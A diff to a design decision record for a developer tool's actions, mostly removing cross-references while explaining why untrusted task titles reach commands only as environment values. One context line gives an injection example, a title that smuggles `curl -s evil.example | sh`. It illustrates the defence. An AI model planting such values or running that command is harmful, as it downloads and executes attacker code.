@@ -23,10 +23,9 @@ shell text, and no value written by people or workers runs as a command or instr
   who clones the repository.
 - The clone's state, including any log, is readable by every process in it, workers included.
 - Some follow-up work needs judgement: reading a merged change and recording lessons, summarising a run. Judgement is
-  the work of a person or a coding agent ([0002](0002-division-of-work.md)), and the tool never calls a model
-  ([0001](0001-role-of-the-tool.md)).
+  the work of a person or a coding agent, and the tool never calls a model.
 - Tool servers give coding agents access to services through a protocol client, a session and credentials held in the
-  agent's configuration. The tool is never a client of them ([0001](0001-role-of-the-tool.md)).
+  agent's configuration. The tool is never a client of them.
 - Values such as task titles, branch names and a worker's notification text are written by people and workers and are
   untrusted. Substituted into command text, they inject commands; placed into a prompt, they inject instructions. For
   example, a task titled `fix"; curl -s evil.example | sh; echo "` runs a downloaded script when pasted between double
@@ -57,8 +56,7 @@ shell text, and no value written by people or workers runs as a command or instr
    its edits stay uncommitted in that working copy and are reported.
 6. Notification events accept commands and HTTP requests only.
 7. No action is automatic unless it says so. The health check reports every automatic attempt action.
-8. Integrations that need a tool server a worker connects to are attempt actions; the binary is never such a client
-   ([0001](0001-role-of-the-tool.md)).
+8. Integrations that need a tool server a worker connects to are attempt actions; the binary is never such a client.
 9. Run records name the action, its kind, its status and its duration, never URLs, headers, bodies or prompts.
 10. The steps of a recipe ([0025](0025-recipes.md)) are not actions, and two of their kinds match action kinds. An
     attempt step starts its worker as an attempt action does, through the worker's ingredient and under the attempt
@@ -72,19 +70,19 @@ shell text, and no value written by people or workers runs as a command or instr
   covers the common notification needs with the same declaration format, value rules and secret rules as lifecycle
   actions, instead of a second mechanism. Actions attach to only these two events because the others fire many times per
   turn and would turn a notification into noise.
-- **2.** The three kinds follow the division of [0002](0002-division-of-work.md): deterministic local work is a command,
+- **2.** The three kinds divide the work: deterministic local work is a command,
   a deterministic remote call is an HTTP request, and work that needs judgement goes to a worker through an attempt
   action. Exactly one kind per action keeps the rules that apply to each action unambiguous.
 - **3.** Untrusted values substituted into command text inject commands. Passed as environment values, they are data
   to the shell unless the declared command chooses to expand them, and that choice is visible in the committed file.
-- **4.** Performing the request in the binary removes the need for a client program on every machine
-  ([0004](0004-runtime-dependencies.md)) and the quoting of JSON and secrets in shell text; JSON encoding by the binary
+- **4.** Performing the request in the binary removes the need for a client program on every machine and the quoting
+  of JSON and secrets in shell text; JSON encoding by the binary
   means a title containing quotes cannot break or extend the body. URLs and headers carry credentials, so they come from
   the environment, never from files that every clone receives, and they never reach a log that workers can read. A 2xx
   status is the protocol's own success signal. A redirect to another host would send the request, and possibly its
   headers, to a host the declaration never named.
-- **5.** Judgement belongs to a person or a coding agent ([0002](0002-division-of-work.md)), and the tool starts the
-  worker program rather than calling a model ([0001](0001-role-of-the-tool.md)). Launching through the worker's
+- **5.** Judgement belongs to a person or a coding agent, and the tool starts the
+  worker program rather than calling a model. Launching through the worker's
   ingredient starts every worker the way an attempt starts it, with the same refused bypass arguments
   ([0011](0011-safety-invariants.md)). The prompt can carry untrusted text, so the worker may be misled. The attempt
   contract bounds what a misled worker can do, and denying commits, pushes and events keeps an action's worker from
@@ -98,13 +96,13 @@ shell text, and no value written by people or workers runs as a command or instr
   and, when its worker calls a model, model cost and a varying result. Requiring an explicit opt-in, and reporting
   automatic attempt actions, keeps that cost a visible choice of the repository.
 - **8.** A tool-server client in the binary would hold service credentials and follow a moving protocol, and the tool
-  would do a worker's job ([0001](0001-role-of-the-tool.md)). A coordinating worker, or the worker an attempt action
+  would do a worker's job. A coordinating worker, or the worker an attempt action
   starts, already owns those connections and credentials. Deterministic integrations reach the service through its API
   (an HTTP request) or its command-line client (a command).
 - **9.** The record lives in the clone's state, which workers read. URLs, headers and bodies carry secrets, and prompts
   carry untrusted text. The name, kind, status and duration are enough to audit what ran.
 - **10.** Making a change needs the same two kinds of work as an event's follow-up, deterministic local work and
-  judgement ([0002](0002-division-of-work.md)), so both lists hold a command and an attempt. An attempt step runs under
+  judgement, so both lists hold a command and an attempt. An attempt step runs under
   the contract that bounds an attempt action ([0011](0011-safety-invariants.md)), so a guard proven for one holds for
   the other. A command action is shell text a repository writes around values people and workers wrote, which is why
   values reach it only as environment values (point 3). A command step has no shell to expand an environment value
@@ -123,7 +121,7 @@ shell text, and no value written by people or workers runs as a command or instr
 ### Shell commands only
 
 At its best, there is one kind, any tool on the machine is available, and the contract stays smallest. It loses
-because every HTTP integration needs a client program the binary cannot assume ([0004](0004-runtime-dependencies.md)),
+because every HTTP integration needs a client program the binary cannot assume,
 JSON and secrets are quoted inside shell text where one stray quote changes the request, and secrets appear on command
 lines that other processes can read.
 
@@ -131,12 +129,12 @@ lines that other processes can read.
 
 At its best, actions call the same tools workers use, deterministically and without the cost of an attempt. It loses
 because the binary would hold service credentials and a protocol client that follows a moving specification, and the
-tool would do a worker's job ([0001](0001-role-of-the-tool.md)). A worker already owns those connections.
+tool would do a worker's job. A worker already owns those connections.
 
 ### Executable extensions for integrations
 
 At its best, any integration runs in process with full control. It loses because extension code is engine code in
-repositories ([0006](0006-repository-contract.md)) that may need a runtime ([0004](0004-runtime-dependencies.md)), and
+repositories ([0006](0006-repository-contract.md)) that may need a runtime, and
 an open extension surface has no rule set that covers it. An ingredient is data that fills fixed contracts
 ([0022](0022-tool-integration.md)), not code that runs in process.
 
